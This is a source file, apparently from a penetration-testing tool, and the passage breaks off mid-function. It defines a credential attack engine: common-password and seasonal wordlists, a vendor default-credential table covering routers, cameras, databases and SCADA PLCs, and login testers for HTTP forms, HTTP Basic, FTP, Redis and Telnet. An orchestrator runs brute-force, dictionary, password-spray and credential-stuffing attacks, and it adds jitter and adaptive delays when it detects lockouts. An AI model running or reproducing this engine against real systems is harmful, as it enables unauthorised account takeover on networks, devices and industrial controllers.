import "./chunk-KFQGP6VL.js";

// server/lib/credential-attack-engine.ts
var BUILTIN_PASSWORD_LISTS = {
  top_100: {
    name: "Top 100 Passwords",
    description: "Most commonly used passwords from breach analysis",
    category: "common",
    source: "SecLists / breach compilations",
    passwords: [
      "123456",
      "password",
      "12345678",
      "qwerty",
      "123456789",
      "12345",
      "1234",
      "111111",
      "1234567",
      "dragon",
      "123123",
      "baseball",
      "abc123",
      "football",
      "monkey",
      "letmein",
      "shadow",
      "master",
      "666666",
      "qwertyuiop",
      "123321",
      "mustang",
      "1234567890",
      "michael",
      "654321",
      "superman",
      "1qaz2wsx",
      "7777777",
      "121212",
      "000000",
      "qazwsx",
      "123qwe",
      "killer",
      "trustno1",
      "jordan",
      "jennifer",
      "zxcvbnm",
      "asdfgh",
      "hunter",
      "buster",
      "soccer",
      "harley",
      "batman",
      "andrew",
      "tigger",
      "sunshine",
      "iloveyou",
      "2000",
      "charlie",
      "robert",
      "thomas",
      "hockey",
      "ranger",
      "daniel",
      "starwars",
      "klaster",
      "112233",
      "george",
      "computer",
      "michelle",
      "jessica",
      "pepper",
      "1111",
      "zxcvbn",
      "555555",
      "11111111",
      "131313",
      "freedom",
      "777777",
      "pass",
      "maggie",
      "159753",
      "aaaaaa",
      "ginger",
      "princess",
      "joshua",
      "cheese",
      "amanda",
      "summer",
      "love",
      "ashley",
      "nicole",
      "chelsea",
      "biteme",
      "matthew",
      "access",
      "yankees",
      "987654321",
      "dallas",
      "austin",
      "thunder",
      "taylor",
      "matrix",
      "mobilemail",
      "mom",
      "monitor",
      "monitoring",
      "montana",
      "moon",
      "moscow"
    ]
  },
  admin_defaults: {
    name: "Admin Default Passwords",
    description: "Default passwords for admin accounts across platforms",
    category: "default",
    passwords: [
      "admin",
      "administrator",
      "password",
      "admin123",
      "admin1234",
      "root",
      "toor",
      "pass",
      "test",
      "guest",
      "master",
      "changeme",
      "default",
      "1234",
      "12345",
      "123456",
      "password1",
      "password123",
      "admin@123",
      "Admin@123",
      "P@ssw0rd",
      "P@ssword1",
      "Welcome1",
      "Welcome123",
      "Passw0rd",
      "letmein",
      "qwerty",
      "abc123",
      "iloveyou",
      "trustno1",
      "p@ssw0rd",
      "admin2024",
      "admin2025",
      "admin2026",
      "secret",
      "manager",
      "supervisor",
      "operator",
      "system",
      "service",
      "support",
      "helpdesk",
      "backup",
      "oracle",
      "postgres",
      "mysql",
      "sa",
      "cisco",
      "enable",
      "class"
    ]
  },
  network_device_defaults: {
    name: "Network Device Defaults",
    description: "Default credentials for routers, switches, firewalls, and IoT devices",
    category: "default",
    passwords: [
      "admin",
      "password",
      "1234",
      "cisco",
      "enable",
      "class",
      "public",
      "private",
      "default",
      "user",
      "guest",
      "manager",
      "monitor",
      "operator",
      "root",
      "toor",
      "ubnt",
      "pi",
      "raspberry",
      "alpine",
      "Fireitup",
      "fortigate",
      "fortinet",
      "pfsense",
      "vyos",
      "mikrotik",
      "aruba",
      "juniper",
      "netgear",
      "linksys",
      "dlink",
      "tplink",
      "asus",
      "belkin",
      "zyxel",
      "hikvision",
      "12345",
      "dahua",
      "admin1",
      "superadmin",
      "support",
      "tech",
      "service",
      "maintenance",
      "debug"
    ]
  },
  web_app_defaults: {
    name: "Web Application Defaults",
    description: "Default credentials for common web applications and CMS platforms",
    category: "default",
    passwords: [
      "admin",
      "password",
      "admin123",
      "root",
      "toor",
      "wordpress",
      "joomla",
      "drupal",
      "magento",
      "prestashop",
      "test",
      "demo",
      "guest",
      "user",
      "manager",
      "tomcat",
      "s3cret",
      "manager1",
      "admin1",
      "changeit",
      "changeme",
      "secret",
      "passw0rd",
      "welcome",
      "letmein",
      "master",
      "vagrant",
      "bitnami",
      "xampp",
      "lamp",
      "mamp",
      "wamp",
      "docker",
      "jenkins",
      "hudson",
      "gitlab",
      "gitea",
      "gogs",
      "nexus",
      "sonar",
      "grafana",
      "kibana",
      "elastic",
      "logstash",
      "prometheus"
    ]
  },
  season_year: {
    name: "Seasonal Passwords",
    description: "Season + year combinations commonly used in corporate environments",
    category: "common",
    passwords: (() => {
      const seasons = ["Spring", "Summer", "Fall", "Autumn", "Winter"];
      const months = [
        "January",
        "February",
        "March",
        "April",
        "May",
        "June",
        "July",
        "August",
        "September",
        "October",
        "November",
        "December"
      ];
      const years = ["2024", "2025", "2026", "24", "25", "26"];
      const suffixes = ["!", "@", "#", "1", "123", "!!", "@1"];
      const list = [];
      for (const word of [...seasons, ...months]) {
        for (const year of years) {
          list.push(`${word}${year}`);
          for (const suffix of suffixes) {
            list.push(`${word}${year}${suffix}`);
          }
        }
      }
      return list;
    })()
  },
  keyboard_walks: {
    name: "Keyboard Walk Patterns",
    description: "Common keyboard walk patterns used as passwords",
    category: "common",
    passwords: [
      "qwerty",
      "qwerty123",
      "qwertyuiop",
      "asdfgh",
      "asdfghjkl",
      "zxcvbn",
      "zxcvbnm",
      "1qaz2wsx",
      "1qaz2wsx3edc",
      "1q2w3e4r",
      "1q2w3e4r5t",
      "1q2w3e",
      "qazwsx",
      "qazwsxedc",
      "zaq1xsw2",
      "!qaz2wsx",
      "1qaz@wsx",
      "qwe123",
      "asd123",
      "zxc123",
      "q1w2e3r4",
      "a1s2d3f4",
      "1234qwer",
      "qwer1234",
      "asdf1234",
      "poiuytrewq",
      "lkjhgfdsa",
      "mnbvcxz",
      "0987654321",
      "pl,okm",
      "1234567890qwertyuiop",
      "qwertyuiop1234567890"
    ]
  }
};
var BUILTIN_USERNAME_LISTS = {
  common_admins: {
    name: "Common Admin Usernames",
    description: "Standard admin/root account names",
    category: "common",
    usernames: [
      "admin",
      "administrator",
      "root",
      "sysadmin",
      "superadmin",
      "sa",
      "dba",
      "webmaster",
      "postmaster",
      "hostmaster",
      "operator",
      "manager",
      "supervisor",
      "support",
      "helpdesk",
      "service",
      "system",
      "backup",
      "test",
      "demo",
      "guest",
      "user",
      "info",
      "web",
      "www",
      "ftp",
      "mail",
      "email",
      "contact",
      "security"
    ]
  },
  service_accounts: {
    name: "Service Account Names",
    description: "Common service and application account names",
    category: "default",
    usernames: [
      "tomcat",
      "jenkins",
      "gitlab",
      "git",
      "svn",
      "deploy",
      "deployer",
      "ci",
      "cd",
      "build",
      "docker",
      "kubernetes",
      "k8s",
      "ansible",
      "puppet",
      "chef",
      "terraform",
      "vagrant",
      "nagios",
      "zabbix",
      "grafana",
      "prometheus",
      "elastic",
      "kibana",
      "logstash",
      "mysql",
      "postgres",
      "mongodb",
      "redis",
      "memcached",
      "rabbitmq",
      "kafka",
      "nginx",
      "apache",
      "httpd",
      "www-data",
      "nobody",
      "daemon",
      "bin",
      "sys"
    ]
  },
  network_defaults: {
    name: "Network Device Usernames",
    description: "Default usernames for network devices and IoT",
    category: "default",
    usernames: [
      "admin",
      "root",
      "user",
      "cisco",
      "enable",
      "manager",
      "monitor",
      "operator",
      "guest",
      "ubnt",
      "pi",
      "vyos",
      "pfsense",
      "netgear",
      "linksys",
      "dlink",
      "tplink",
      "asus",
      "hikvision",
      "dahua",
      "supervisor",
      "tech",
      "service",
      "maintenance",
      "debug",
      "installer",
      "default",
      "factory",
      "setup",
      "config"
    ]
  }
};
var DEFAULT_CREDENTIALS = [
  // Network Devices
  { vendor: "Cisco", product: "IOS Router", protocol: "ssh", port: 22, username: "admin", password: "admin", accessLevel: "admin", notes: "Factory default" },
  { vendor: "Cisco", product: "IOS Router", protocol: "ssh", port: 22, username: "cisco", password: "cisco", accessLevel: "admin" },
  { vendor: "Cisco", product: "IOS Router", protocol: "telnet", port: 23, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Cisco", product: "ASA Firewall", protocol: "ssh", port: 22, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Cisco", product: "ASA Firewall", protocol: "http_basic", port: 443, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Juniper", product: "JunOS", protocol: "ssh", port: 22, username: "root", password: "root123", accessLevel: "root" },
  { vendor: "Juniper", product: "JunOS", protocol: "ssh", port: 22, username: "admin", password: "abc123", accessLevel: "admin" },
  { vendor: "MikroTik", product: "RouterOS", protocol: "ssh", port: 22, username: "admin", password: "", accessLevel: "admin", notes: "Empty password" },
  { vendor: "Ubiquiti", product: "UniFi", protocol: "ssh", port: 22, username: "ubnt", password: "ubnt", accessLevel: "admin" },
  { vendor: "Fortinet", product: "FortiGate", protocol: "ssh", port: 22, username: "admin", password: "", accessLevel: "admin", notes: "Empty password" },
  { vendor: "Fortinet", product: "FortiGate", protocol: "http_form", port: 443, username: "admin", password: "", accessLevel: "admin" },
  { vendor: "Palo Alto", product: "PAN-OS", protocol: "ssh", port: 22, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "pfSense", product: "Firewall", protocol: "http_form", port: 443, username: "admin", password: "pfsense", accessLevel: "admin" },
  { vendor: "Netgear", product: "Router", protocol: "http_basic", port: 80, username: "admin", password: "password", accessLevel: "admin" },
  { vendor: "Linksys", product: "Router", protocol: "http_basic", port: 80, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "D-Link", product: "Router", protocol: "http_basic", port: 80, username: "admin", password: "", accessLevel: "admin" },
  { vendor: "TP-Link", product: "Router", protocol: "http_basic", port: 80, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "ASUS", product: "Router", protocol: "http_basic", port: 80, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Aruba", product: "Controller", protocol: "ssh", port: 22, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "ZyXEL", product: "Router", protocol: "http_basic", port: 80, username: "admin", password: "1234", accessLevel: "admin" },
  // Cameras / IoT
  { vendor: "Hikvision", product: "IP Camera", protocol: "http_basic", port: 80, username: "admin", password: "12345", accessLevel: "admin" },
  { vendor: "Dahua", product: "IP Camera", protocol: "http_basic", port: 80, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Axis", product: "IP Camera", protocol: "http_basic", port: 80, username: "root", password: "pass", accessLevel: "admin" },
  { vendor: "Samsung", product: "IP Camera", protocol: "http_basic", port: 80, username: "admin", password: "4321", accessLevel: "admin" },
  // Web Applications
  { vendor: "Apache", product: "Tomcat", protocol: "http_basic", port: 8080, username: "tomcat", password: "tomcat", accessLevel: "manager" },
  { vendor: "Apache", product: "Tomcat", protocol: "http_basic", port: 8080, username: "admin", password: "admin", accessLevel: "manager" },
  { vendor: "Apache", product: "Tomcat", protocol: "http_basic", port: 8080, username: "manager", password: "manager", accessLevel: "manager" },
  { vendor: "Apache", product: "Tomcat", protocol: "http_basic", port: 8080, username: "role1", password: "role1", accessLevel: "manager" },
  { vendor: "Apache", product: "Tomcat", protocol: "http_basic", port: 8080, username: "tomcat", password: "s3cret", accessLevel: "manager" },
  { vendor: "Jenkins", product: "CI/CD", protocol: "http_form", port: 8080, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Grafana", product: "Dashboard", protocol: "http_form", port: 3e3, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Kibana", product: "Dashboard", protocol: "http_form", port: 5601, username: "elastic", password: "changeme", accessLevel: "admin" },
  { vendor: "GitLab", product: "DevOps", protocol: "http_form", port: 443, username: "root", password: "5iveL!fe", accessLevel: "admin" },
  { vendor: "Portainer", product: "Docker UI", protocol: "http_form", port: 9e3, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "phpMyAdmin", product: "DB Admin", protocol: "http_form", port: 80, username: "root", password: "", accessLevel: "admin" },
  { vendor: "WordPress", product: "CMS", protocol: "http_form", port: 80, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Joomla", product: "CMS", protocol: "http_form", port: 80, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Nagios", product: "Monitoring", protocol: "http_basic", port: 80, username: "nagiosadmin", password: "nagios", accessLevel: "admin" },
  { vendor: "Zabbix", product: "Monitoring", protocol: "http_form", port: 80, username: "Admin", password: "zabbix", accessLevel: "admin" },
  { vendor: "SonarQube", product: "Code Quality", protocol: "http_form", port: 9e3, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Nexus", product: "Repository", protocol: "http_form", port: 8081, username: "admin", password: "admin123", accessLevel: "admin" },
  // Databases
  { vendor: "MySQL", product: "Database", protocol: "mysql", port: 3306, username: "root", password: "", accessLevel: "root", notes: "Empty password" },
  { vendor: "MySQL", product: "Database", protocol: "mysql", port: 3306, username: "root", password: "root", accessLevel: "root" },
  { vendor: "MySQL", product: "Database", protocol: "mysql", port: 3306, username: "root", password: "mysql", accessLevel: "root" },
  { vendor: "MySQL", product: "Database", protocol: "mysql", port: 3306, username: "root", password: "password", accessLevel: "root" },
  { vendor: "PostgreSQL", product: "Database", protocol: "postgresql", port: 5432, username: "postgres", password: "postgres", accessLevel: "superuser" },
  { vendor: "PostgreSQL", product: "Database", protocol: "postgresql", port: 5432, username: "postgres", password: "password", accessLevel: "superuser" },
  { vendor: "Microsoft", product: "SQL Server", protocol: "mssql", port: 1433, username: "sa", password: "sa", accessLevel: "sysadmin" },
  { vendor: "Microsoft", product: "SQL Server", protocol: "mssql", port: 1433, username: "sa", password: "Password1", accessLevel: "sysadmin" },
  { vendor: "Redis", product: "Cache", protocol: "redis", port: 6379, username: "", password: "", accessLevel: "admin", notes: "No auth" },
  { vendor: "MongoDB", product: "Database", protocol: "mongodb", port: 27017, username: "", password: "", accessLevel: "admin", notes: "No auth" },
  { vendor: "MongoDB", product: "Database", protocol: "mongodb", port: 27017, username: "admin", password: "admin", accessLevel: "admin" },
  // Remote Access
  { vendor: "SSH", product: "OpenSSH", protocol: "ssh", port: 22, username: "root", password: "root", accessLevel: "root" },
  { vendor: "SSH", product: "OpenSSH", protocol: "ssh", port: 22, username: "root", password: "toor", accessLevel: "root" },
  { vendor: "SSH", product: "OpenSSH", protocol: "ssh", port: 22, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "SSH", product: "OpenSSH", protocol: "ssh", port: 22, username: "pi", password: "raspberry", accessLevel: "user" },
  { vendor: "SSH", product: "OpenSSH", protocol: "ssh", port: 22, username: "vagrant", password: "vagrant", accessLevel: "user" },
  { vendor: "FTP", product: "vsftpd", protocol: "ftp", port: 21, username: "anonymous", password: "anonymous", accessLevel: "read" },
  { vendor: "FTP", product: "vsftpd", protocol: "ftp", port: 21, username: "ftp", password: "ftp", accessLevel: "read" },
  { vendor: "VNC", product: "RealVNC", protocol: "vnc", port: 5900, username: "", password: "password", accessLevel: "desktop" },
  { vendor: "VNC", product: "RealVNC", protocol: "vnc", port: 5900, username: "", password: "1234", accessLevel: "desktop" },
  { vendor: "Microsoft", product: "RDP", protocol: "rdp", port: 3389, username: "administrator", password: "password", accessLevel: "admin" },
  { vendor: "Microsoft", product: "RDP", protocol: "rdp", port: 3389, username: "admin", password: "admin", accessLevel: "admin" },
  // Mail
  { vendor: "SMTP", product: "Mail Server", protocol: "smtp", port: 25, username: "admin", password: "admin", accessLevel: "relay" },
  { vendor: "SNMP", product: "Agent", protocol: "snmp", port: 161, username: "", password: "public", accessLevel: "read", notes: "Community string" },
  { vendor: "SNMP", product: "Agent", protocol: "snmp", port: 161, username: "", password: "private", accessLevel: "write", notes: "Community string" },
  // Industrial / SCADA
  { vendor: "Siemens", product: "S7 PLC", protocol: "http_basic", port: 80, username: "admin", password: "admin", accessLevel: "admin" },
  { vendor: "Schneider", product: "Modicon PLC", protocol: "http_basic", port: 80, username: "USER", password: "USER", accessLevel: "admin" },
  { vendor: "Allen-Bradley", product: "ControlLogix", protocol: "http_basic", port: 80, username: "admin", password: "1234", accessLevel: "admin" }
];
async function testHttpForm(host, port, username, password, timeoutMs, loginUrl, formAction, usernameField, passwordField, csrfTokenName, csrfTokenUrl, successIndicator, failureIndicator, contentType) {
  try {
    const scheme = port === 443 ? "https" : "http";
    const baseUrl = `${scheme}://${host}${port === 80 || port === 443 ? "" : `:${port}`}`;
    const targetUrl = loginUrl || `${baseUrl}/login`;
    const actionUrl = formAction || targetUrl;
    let csrfToken = "";
    let cookies = "";
    if (csrfTokenName) {
      const pageUrl = csrfTokenUrl || targetUrl;
      const pageResp = await fetch(pageUrl, {
        signal: AbortSignal.timeout(timeoutMs),
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" },
        redirect: "follow"
      });
      const pageHtml = await pageResp.text();
      cookies = pageResp.headers.get("set-cookie") || "";
      const csrfRegex = new RegExp(`name=["']${csrfTokenName}["'][^>]*value=["']([^"']+)["']`, "i");
      const csrfAltRegex = new RegExp(`value=["']([^"']+)["'][^>]*name=["']${csrfTokenName}["']`, "i");
      const match = pageHtml.match(csrfRegex) || pageHtml.match(csrfAltRegex);
      if (match) csrfToken = match[1];
    }
    let body;
    let contentTypeHeader;
    if (contentType === "json") {
      contentTypeHeader = "application/json";
      const payload = {
        [usernameField || "username"]: username,
        [passwordField || "password"]: password
      };
      if (csrfToken && csrfTokenName) payload[csrfTokenName] = csrfToken;
      body = JSON.stringify(payload);
    } else {
      contentTypeHeader = "application/x-www-form-urlencoded";
      const params = new URLSearchParams();
      params.set(usernameField || "username", username);
      params.set(passwordField || "password", password);
      if (csrfToken && csrfTokenName) params.set(csrfTokenName, csrfToken);
      body = params.toString();
    }
    const headers = {
      "Content-Type": contentTypeHeader,
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    };
    if (cookies) headers["Cookie"] = cookies;
    const resp = await fetch(actionUrl, {
      method: "POST",
      headers,
      body,
      redirect: "manual",
      signal: AbortSignal.timeout(timeoutMs)
    });
    const respText = await resp.text();
    const respCode = resp.status;
    let success = false;
    if (successIndicator) {
      success = new RegExp(successIndicator, "i").test(respText);
    } else if (failureIndicator) {
      success = !new RegExp(failureIndicator, "i").test(respText);
    } else {
      if (respCode === 302 || respCode === 301) {
        const location = resp.headers.get("location") || "";
        success = !location.includes("login") && !location.includes("error") && !location.includes("fail");
      } else if (respCode === 200) {
        const hasLoginForm = /type=["']password["']/i.test(respText);
        const hasErrorMsg = /invalid|incorrect|failed|wrong|error|denied/i.test(respText);
        success = !hasLoginForm && !hasErrorMsg;
      }
    }
    return {
      success,
      responseCode: respCode,
      responseSnippet: respText.substring(0, 200)
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}
async function testHttpBasic(host, port, username, password, timeoutMs) {
  try {
    const scheme = port === 443 ? "https" : "http";
    const url = `${scheme}://${host}${port === 80 || port === 443 ? "" : `:${port}`}/`;
    const auth = Buffer.from(`${username}:${password}`).toString("base64");
    const resp = await fetch(url, {
      headers: {
        Authorization: `Basic ${auth}`,
        "User-Agent": "Mozilla/5.0"
      },
      signal: AbortSignal.timeout(timeoutMs)
    });
    return {
      success: resp.status === 200 || resp.status === 301 || resp.status === 302,
      responseCode: resp.status,
      responseSnippet: (await resp.text()).substring(0, 200)
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}
async function testSsh(host, port, username, password, timeoutMs) {
  try {
    const net = await import("net");
    return new Promise((resolve) => {
      const socket = new net.Socket();
      let banner = "";
      socket.setTimeout(timeoutMs);
      socket.connect(port, host, () => {
        socket.on("data", (data) => {
          banner += data.toString();
          socket.destroy();
          resolve({
            success: false,
            // Can't actually test auth without ssh2 library
            responseSnippet: `SSH banner: ${banner.trim().substring(0, 100)}. Note: Full SSH auth testing requires ssh2 library.`
          });
        });
      });
      socket.on("timeout", () => {
        socket.destroy();
        resolve({ success: false, error: "Connection timeout" });
      });
      socket.on("error", (err) => {
        resolve({ success: false, error: err.message });
      });
    });
  } catch (err) {
    return { success: false, error: err.message };
  }
}
async function testFtp(host, port, username, password, timeoutMs) {
  try {
    const net = await import("net");
    return new Promise((resolve) => {
      const socket = new net.Socket();
      let response = "";
      let phase = "banner";
      socket.setTimeout(timeoutMs);
      socket.connect(port, host, () => {
      });
      socket.on("data", (data) => {
        response += data.toString();
        if (phase === "banner" && response.includes("220")) {
          phase = "user";
          socket.write(`USER ${username}\r
`);
        } else if (phase === "user" && (response.includes("331") || response.includes("230"))) {
          if (response.includes("230")) {
            socket.destroy();
            resolve({ success: true, responseSnippet: response.substring(0, 200) });
            return;
          }
          phase = "pass";
          socket.write(`PASS ${password}\r
`);
        } else if (phase === "pass") {
          const success = response.includes("230");
          socket.write("QUIT\r\n");
          socket.destroy();
          resolve({ success, responseSnippet: response.substring(0, 200) });
        }
      });
      socket.on("timeout", () => {
        socket.destroy();
        resolve({ success: false, error: "Connection timeout" });
      });
      socket.on("error", (err) => {
        resolve({ success: false, error: err.message });
      });
    });
  } catch (err) {
    return { success: false, error: err.message };
  }
}
async function testRedis(host, port, _username, password, timeoutMs) {
  try {
    const net = await import("net");
    return new Promise((resolve) => {
      const socket = new net.Socket();
      let response = "";
      socket.setTimeout(timeoutMs);
      socket.connect(port, host, () => {
        if (password) {
          socket.write(`AUTH ${password}\r
`);
        } else {
          socket.write("PING\r\n");
        }
      });
      socket.on("data", (data) => {
        response += data.toString();
        if (response.includes("+OK") || response.includes("+PONG")) {
          socket.write("QUIT\r\n");
          socket.destroy();
          resolve({ success: true, responseSnippet: response.trim() });
        } else if (response.includes("-ERR") || response.includes("-NOAUTH")) {
          socket.destroy();
          resolve({ success: false, responseSnippet: response.trim() });
        }
      });
      socket.on("timeout", () => {
        socket.destroy();
        resolve({ success: false, error: "Connection timeout" });
      });
      socket.on("error", (err) => {
        resolve({ success: false, error: err.message });
      });
    });
  } catch (err) {
    return { success: false, error: err.message };
  }
}
async function testTelnet(host, port, username, password, timeoutMs) {
  try {
    const net = await import("net");
    return new Promise((resolve) => {
      const socket = new net.Socket();
      let response = "";
      let phase = "connect";
      socket.setTimeout(timeoutMs);
      socket.connect(port, host, () => {
      });
      socket.on("data", (data) => {
        response += data.toString();
        if (phase === "connect" && /login:|username:/i.test(response)) {
          phase = "user";
          socket.write(`${username}\r
`);
        } else if (phase === "user" && /password:/i.test(response)) {
          phase = "pass";
          socket.write(`${password}\r
`);
        } else if (phase === "pass") {
          const success = /\$|#|>|welcome|success/i.test(response) && !/incorrect|invalid|denied|failed/i.test(response);
          socket.destroy();
          resolve({ success, responseSnippet: response.substring(0, 200) });
        }
      });
      socket.on("timeout", () => {
        socket.destroy();
        resolve({ success: false, error: "Connection timeout" });
      });
      socket.on("error", (err) => {
        resolve({ success: false, error: err.message });
      });
    });
  } catch (err) {
    return { success: false, error: err.message };
  }
}
async function testGenericTcp(host, port, _username, _password, timeoutMs) {
  try {
    const net = await import("net");
    return new Promise((resolve) => {
      const socket = new net.Socket();
      socket.setTimeout(timeoutMs);
      socket.connect(port, host, () => {
        socket.destroy();
        resolve({ success: false, responseSnippet: `Port ${port} open but protocol tester not available` });
      });
      socket.on("timeout", () => {
        socket.destroy();
        resolve({ success: false, error: "Timeout" });
      });
      socket.on("error", (err) => {
        resolve({ success: false, error: err.message });
      });
    });
  } catch (err) {
    return { success: false, error: err.message };
  }
}
function getProtocolTester(protocol) {
  switch (protocol) {
    case "http_basic":
    case "http_digest":
      return testHttpBasic;
    case "ssh":
      return testSsh;
    case "ftp":
      return testFtp;
    case "redis":
      return testRedis;
    case "telnet":
      return testTelnet;
    default:
      return testGenericTcp;
  }
}
function detectLockout(responses) {
  const lockoutIndicators = [];
  const has429 = responses.some((r) => r.responseCode === 429);
  if (has429) lockoutIndicators.push("HTTP 429 Too Many Requests");
  const recent = responses.slice(-5);
  const all403 = recent.length >= 3 && recent.every((r) => r.responseCode === 403);
  if (all403) lockoutIndicators.push("Consecutive HTTP 403 Forbidden");
  const lockoutKeywords = /locked|lockout|too many|rate limit|blocked|banned|suspended|captcha|recaptcha/i;
  const hasLockoutMsg = responses.some((r) => lockoutKeywords.test(r.responseSnippet || ""));
  if (hasLockoutMsg) lockoutIndicators.push("Lockout message in response");
  const hasCaptcha = responses.some((r) => /captcha|recaptcha|hcaptcha/i.test(r.responseSnippet || ""));
  if (hasCaptcha) lockoutIndicators.push("CAPTCHA challenge detected");
  const connectionRefused = responses.filter((r) => r.error?.includes("ECONNREFUSED")).length;
  if (connectionRefused > 2) lockoutIndicators.push("Connection refused (possible IP ban)");
  if (lockoutIndicators.length === 0) {
    return { detected: false, type: "unknown", indicators: [] };
  }
  const type = hasCaptcha ? "captcha" : has429 ? "rate_limit" : connectionRefused > 2 ? "ip_lockout" : "account_lockout";
  return {
    detected: true,
    type,
    indicators: lockoutIndicators
  };
}
async function executeCredentialAttack(config) {
  const sessionId = `cred-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const startedAt = Date.now();
  const successfulLogins = [];
  const errors = [];
  let totalAttempts = 0;
  let lockoutsDetected = 0;
  let status = "completed";
  console.log(`[CredAttack] Starting ${config.mode} attack against ${config.target.host}:${config.target.port} (${config.target.protocol})`);
  let pairs = [];
  switch (config.mode) {
    case "credential_stuffing":
      pairs = config.credentialPairs || [];
      break;
    case "default_creds":
      pairs = getDefaultCredentialsForTarget(
        config.target.protocol,
        config.target.port
      ).map((c) => ({ username: c.username, password: c.password, source: `${c.vendor} ${c.product}` }));
      break;
    case "password_spray": {
      const usernames = config.usernames || BUILTIN_USERNAME_LISTS.common_admins.usernames;
      const passwords = config.passwords || ["Password1", "Welcome1", "P@ssw0rd", config.target.host.split(".")[0] + "2026!"];
      for (const password of passwords) {
        for (const username of usernames) {
          pairs.push({ username, password });
        }
      }
      break;
    }
    case "brute_force":
    case "dictionary":
    default: {
      const usernames = config.usernames || BUILTIN_USERNAME_LISTS.common_admins.usernames.slice(0, 5);
      const passwordList = config.passwordListName ? BUILTIN_PASSWORD_LISTS[config.passwordListName]?.passwords || config.passwords || [] : config.passwords || BUILTIN_PASSWORD_LISTS.top_100.passwords;
      for (const username of usernames) {
        for (const password of passwordList) {
          pairs.push({ username, password });
        }
      }
      break;
    }
  }
  if (pairs.length > config.maxTotalAttempts) {
    pairs = pairs.slice(0, config.maxTotalAttempts);
  }
  const globalDeadline = startedAt + config.globalTimeoutSec * 1e3;
  const userAttemptCounts = /* @__PURE__ */ new Map();
  const recentResponses = [];
  const isHttpForm = config.target.protocol === "http_form" || config.target.protocol === "http_json_api";
  for (const pair of pairs) {
    if (Date.now() > globalDeadline) {
      status = "stopped_timeout";
      console.log(`[CredAttack] Global timeout reached after ${totalAttempts} attempts`);
      break;
    }
    const userCount = userAttemptCounts.get(pair.username) || 0;
    if (config.lockoutDetection && userCount >= config.maxAttemptsPerUser) {
      continue;
    }
    if (totalAttempts > 0) {
      const jitter = Math.random() * config.jitterMs;
      await sleep(config.delayBetweenAttemptsMs + jitter);
    }
    if (config.mode === "password_spray" && config.sprayDelayBetweenPasswordsSec) {
      const prevPair = pairs[totalAttempts - 1];
      if (prevPair && prevPair.password !== pair.password) {
        console.log(`[CredAttack] Spray delay: waiting ${config.sprayDelayBetweenPasswordsSec}s before next password`);
        await sleep(config.sprayDelayBetweenPasswordsSec * 1e3);
      }
    }
    totalAttempts++;
    userAttemptCounts.set(pair.username, userCount + 1);
    let result2;
    try {
      if (isHttpForm) {
        result2 = await testHttpForm(
          config.target.host,
          config.target.port,
          pair.username,
          pair.password,
          config.timeoutPerAttemptMs,
          config.target.loginUrl,
          config.target.loginFormAction,
          config.target.usernameField,
          config.target.passwordField,
          config.target.csrfTokenName,
          config.target.csrfTokenUrl,
          config.target.successIndicator,
          config.target.failureIndicator,
          config.target.contentType
        );
      } else {
        const tester = getProtocolTester(config.target.protocol);
        result2 = await tester(
          config.target.host,
          config.target.port,
          pair.username,
          pair.password,
          config.timeoutPerAttemptMs
        );
      }
    } catch (err) {
      result2 = { success: false, error: err.message };
      errors.push(`${pair.username}: ${err.message}`);
    }
    recentResponses.push(result2);
    if (result2.success) {
      console.log(`[CredAttack] \u2713 SUCCESS: ${pair.username}:${pair.password} on ${config.target.host}:${config.target.port}`);
      successfulLogins.push({
        username: pair.username,
        password: pair.password,
        timestamp: Date.now(),
        responseCode: result2.responseCode,
        responseSnippet: result2.responseSnippet,
        additionalInfo: pair.source
      });
      if (config.stopOnFirstSuccess) {
        break;
      }
    }
    if (config.lockoutDetection && totalAttempts % 5 === 0) {
      const lockout = detectLockout(recentResponses.slice(-10));
      if (lockout.detected) {
        lockoutsDetected++;
        console.log(`[CredAttack] \u26A0 Lockout detected: ${lockout.type} \u2014 ${lockout.indicators.join(", ")}`);
        if (lockout.type === "ip_lockout" || lockout.type === "captcha") {
          status = "stopped_lockout";
          break;
        }
        if (lockout.type === "rate_limit") {
          config.delayBetweenAttemptsMs = Math.min(config.delayBetweenAttemptsMs * 2, 1e4);
          console.log(`[CredAttack] Increased delay to ${config.delayBetweenAttemptsMs}ms`);
        }
        if (lockout.type === "account_lockout" && config.lockoutCooldownSec > 0) {
          console.log(`[CredAttack] Waiting ${config.lockoutCooldownSec}s for lockout cooldown`);
          await sleep(config.lockoutCooldownSec * 1e3);
        }
      }
    }
  }
  const completedAt = Date.now();
  const durationSec = Math.round((completedAt - startedAt) / 1e3);
  const result = {
    sessionId,
    mode: config.mode,
    target: `${config.target.host}:${config.target.port}`,
    protocol: config.target.protocol,
    startedAt,
    completedAt,
    durationSec,
    totalAttempts,
    successfulLogins,
    failedAttempts: totalAttempts - successfulLogins.length,
    lockoutsDetected,
    errors: errors.slice(0, 20),
    status,
    rateInfo: {
      avgRequestsPerSec: durationSec > 0 ? Math.round(totalAttempts / durationSec * 100) / 100 : 0,
      peakRequestsPerSec: 1e3 / config.delayBetweenAttemptsMs,
      totalDelayMs: totalAttempts * config.delayBetweenAttemptsMs
    }
  };
  console.log(`[CredAttack] Completed: ${totalAttempts} attempts, ${successfulLogins.length} successful, ${lockoutsDetected} lockouts, ${durationSec}s`);
  return result;
}
function getDefaultCredentialsForTarget(protocol, port) {
  return DEFAULT_CREDENTIALS.filter(
